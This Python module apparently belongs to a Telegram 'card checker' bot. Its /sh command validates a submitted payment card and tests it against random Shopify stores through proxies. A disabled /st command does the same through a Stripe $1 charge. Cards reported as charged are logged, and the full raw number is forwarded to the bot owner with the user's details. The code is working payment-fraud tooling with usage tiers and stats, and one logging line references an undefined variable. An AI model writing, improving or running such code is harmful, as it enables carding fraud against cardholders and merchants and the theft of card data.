"""Single check handler — /sh command. Single Shopify card check."""

import logging
import random
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from core.card_parser import parse_card, luhn_valid, is_expired
from core.checker import shopify_check, stripe_check
from core.loader import pick_store
from core.error_handler import safe_send
from core.rate_limiter import rate_limiter, get_cooldown_message, get_hourly_message
from core.bin_lookup import BinLookup, get_flag
from core.database import is_banned, increment_check_stats
from templates.messages import (
    format_single_check,
    format_usage_sh,
    format_usage_st,
    format_card_error,
    format_error,
    format_banned,
    format_checking,
)

logger = logging.getLogger(__name__)


async def single_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /sh command — single Shopify check."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return

    # Rate limit: command cooldown
    allowed, remaining = rate_limiter.check_command_cooldown(user.id, "sh")
    if not allowed:
        await update.message.reply_text(get_cooldown_message("/sh", remaining))
        return

    # Parse card from command args or reply
    raw_card = None
    if ctx.args:
        raw_card = " ".join(ctx.args)
    elif update.message.reply_to_message:
        raw_card = update.message.reply_to_message.text

    if not raw_card:
        await update.message.reply_text(format_usage_sh(), parse_mode=ParseMode.HTML)
        return

    card = parse_card(raw_card)
    if not card:
        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
        return

    # Validate Luhn
    if not luhn_valid(card.number):
        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
        return

    # Check expiry
    if is_expired(card.month, card.year):
        await update.message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
        return

    # Rate limit: hourly check limit
    from core.tier_manager import get_user_tier, get_user_config
    tier = get_user_tier(conn, user.id)
    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, 1)
    if not hourly_ok:
        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
        return

    # Card repeat detection (same card in 5 min)
    if rate_limiter.is_card_repeat(user.id, card.number, window=300):
        rate_limiter.refund_hourly(user.id)
        await update.message.reply_text(format_error("You already checked this card recently."))
        return

    # Send "checking..." message
    checking_msg = await update.message.reply_text(
        format_checking(card), parse_mode=ParseMode.HTML
    )

    # Pick random store from all combined sites
    loader = ctx.bot_data.get("loader")
    if loader:
        stores = loader.get_stores("all_combined")
    else:
        stores = ctx.bot_data.get("stores_all", [])
    if not stores:
        rate_limiter.refund_hourly(user.id)
        await checking_msg.edit_text(format_error("No stores available."))
        return


    async def _run_store_check():
        used = set()
        pm = ctx.bot_data.get("proxy_manager")
        max_store_retries = 5
        res = None
        s = None
        for attempt in range(max_store_retries):
            s = pick_store(stores, used)
            if not s:
                break
            used.add(s)
            
            p = pm.get_proxy(user.id) if pm else None
            res = await shopify_check(card, s, proxy=p, timeout=120)
            
            if res.status != "SITE_ERROR":
                break
                
            await asyncio.sleep(1)
            
        if res is None or res.status == "SITE_ERROR":
            from core.checker import CheckResult
            res = CheckResult("DEAD", "All stores returned errors — try again later", "Shopify Payments", 0.0, s or "unknown", card)
            
        return res

    # Run check + BIN lookup in parallel (saves 2-10s latency)
    import asyncio
    bin_lookup: BinLookup = ctx.bot_data["bin_lookup"]
    
    check_task = asyncio.create_task(_run_store_check())
    bin_task = asyncio.create_task(bin_lookup.lookup(card.bin))
    
    result, bin_info = await asyncio.gather(check_task, bin_task)

    if not result:
        await checking_msg.edit_text(format_error("No working stores available right now."))
        rate_limiter.refund_hourly(user.id)
        return

    if not isinstance(bin_info, dict):
        bin_info = {"bin": card.bin, "bank": "Unknown", "brand": "Unknown", "type": "Unknown", "level": "Unknown", "country": "Unknown", "flag": ""}
    flag = get_flag(bin_info.get("country", ""))

    # Format result
    text = format_single_check(
        status=result.status,
        card=card,
        gateway=result.gateway,
        response=result.message,
        price=result.price,
        bin_info=bin_info,
        flag=flag,
    )

    await checking_msg.edit_text(text, parse_mode=ParseMode.HTML)

    # Update stats
    status_key = result.status.lower().replace("live_3ds", "live")
    increment_check_stats(conn, user.id, status_key, 1)

    # Log charged cards
    if result.status == "CHARGED":
        from core.database import log_charged_card
        log_charged_card(
            conn, user.id,
            card_number=card.number,
            card_masked=card.masked,
            gateway=result.gateway,
            response=result.message,
            price=result.price,
            store_url=result.store,
            bin_code=card.bin,
        )
        # Forward to owner (Phase 5 feature)
        try:
            owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
            await safe_send(
                ctx.bot,
                chat_id=owner_id,
                text=(
                    f"🤍 CHARGED CARD DETECTED 🤍\n\n"
                    f"💳 CC : {card.raw}\n"
                    f"🛒 Gateway : {result.gateway}\n"
                    f"📝 Response : {result.message}\n"
                    f"💵 Price : ${result.price}\n"
                    f"🏪 Store : {result.store}\n"
                    f"👤 User : {user.id} ({user.username})\n\n"
                    f"💳 BIN: {card.bin}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning("Failed to forward charged card to owner: %s", e)

    logger.info(
        "Single check: user=%d card=%s status=%s store=%s",
        user.id, card.masked, result.status, store,
    )

async def stripe_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /st command — single Stripe $1 check. (Currently disabled.)"""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return

    from templates.messages import format_error
    await update.message.reply_text(
        format_error("Stripe check is currently disabled.\nUse <code>/sh</code> for Shopify checks instead."),
        parse_mode=ParseMode.HTML,
    )
    return

    # Rate limit: command cooldown
    allowed, remaining = rate_limiter.check_command_cooldown(user.id, "st")
    if not allowed:
        await update.message.reply_text(get_cooldown_message("/st", remaining))
        return

    # Parse card from command args or reply
    raw_card = None
    if ctx.args:
        raw_card = " ".join(ctx.args)
    elif update.message.reply_to_message:
        raw_card = update.message.reply_to_message.text

    if not raw_card:
        await update.message.reply_text(format_usage_st(), parse_mode=ParseMode.HTML)
        return

    card = parse_card(raw_card)
    if not card:
        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
        return

    if not luhn_valid(card.number):
        await update.message.reply_text(format_card_error(), parse_mode=ParseMode.HTML)
        return

    if is_expired(card.month, card.year):
        await update.message.reply_text(format_error("Card is expired."), parse_mode=ParseMode.HTML)
        return

    # Rate limit: hourly check limit
    from core.tier_manager import get_user_tier
    tier = get_user_tier(conn, user.id)
    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, 1)
    if not hourly_ok:
        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
        return

    # Card repeat detection
    if rate_limiter.is_card_repeat(user.id, card.number, window=300):
        rate_limiter.refund_hourly(user.id)
        await update.message.reply_text(format_error("You already checked this card recently."))
        return

    # Send "checking..." message
    checking_msg = await update.message.reply_text(
        format_checking(card), parse_mode=ParseMode.HTML
    )

    # Get proxy if available
    pm = ctx.bot_data.get("proxy_manager")
    proxy = pm.get_proxy(user.id) if pm else None

    # Run Stripe check
    stripe_sk = ctx.bot_data["config"].get("stripe", {}).get("secret_key", "")
    result = await stripe_check(card, proxy=proxy, timeout=15, secret_key=stripe_sk)

    if result.status == "ERROR" and ("network" in result.message.lower() or "configured" in result.message.lower()):
        rate_limiter.refund_hourly(user.id)

    # BIN lookup
    bin_lookup: BinLookup = ctx.bot_data["bin_lookup"]
    bin_info = await bin_lookup.lookup(card.bin)
    if not isinstance(bin_info, dict):
        bin_info = {"bin": card.bin, "bank": "Unknown", "brand": "Unknown", "type": "Unknown", "level": "Unknown", "country": "Unknown", "flag": ""}
    flag = get_flag(bin_info.get("country", ""))

    # Format result
    text = format_single_check(
        status=result.status,
        card=card,
        gateway=result.gateway,
        response=result.message,
        price=result.price,
        bin_info=bin_info,
        flag=flag,
    )

    await checking_msg.edit_text(text, parse_mode=ParseMode.HTML)

    # Update stats
    status_key = result.status.lower().replace("live_3ds", "live")
    increment_check_stats(conn, user.id, status_key, 1)

    # Log charged cards
    if result.status == "CHARGED":
        from core.database import log_charged_card
        log_charged_card(
            conn, user.id,
            card_number=card.number,
            card_masked=card.masked,
            gateway=result.gateway,
            response=result.message,
            price=result.price,
            store_url=result.store,
            bin_code=card.bin,
        )
        try:
            owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
            await ctx.bot.send_message(
                chat_id=owner_id,
                text=(
                    f"🤍 CHARGED (Stripe) 🤍\n\n"
                    f"💳 CC : {card.raw}\n"
                    f"🛒 Gateway : {result.gateway}\n"
                    f"📝 Response : {result.message}\n"
                    f"💵 Price : ${result.price}\n"
                    f"👤 User : {user.id} ({user.username})\n\n"
                    f"💳 BIN: {card.bin}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning("Failed to forward charged card to owner: %s", e)

    logger.info(
        "Stripe check: user=%d card=%s status=%s",
        user.id, card.masked, result.status,
    )
